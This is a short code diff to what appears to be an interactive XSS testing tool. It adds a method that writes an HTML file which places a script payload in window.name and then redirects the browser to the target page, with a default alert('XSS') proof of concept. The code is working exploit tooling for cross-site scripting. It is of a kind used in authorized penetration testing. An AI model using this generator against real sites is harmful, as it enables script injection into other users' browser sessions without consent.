@@ -30,6 +30,19 @@ class XSSCommands:
         print('')
         print('')
         input("Press ENTER to return to menu.")
+
+    def create_window_name_exploit(self, payload=None, filename="windowname.html"):
+        if payload is None:
+            payload = "<script>alert('XSS')</script>"
+        target_url = self.driver.current_url
+        html = f"<script>window.name='{payload}';location='{target_url}';</script>"
+        try:
+            with open(filename, "w") as f:
+                f.write(html)
+            print(f"Exploit file written to {filename}")
+        except Exception as exc:
+            print(f"Failed to write exploit file: {exc}")
+        input("Press ENTER to return to menu.")
         
 
 
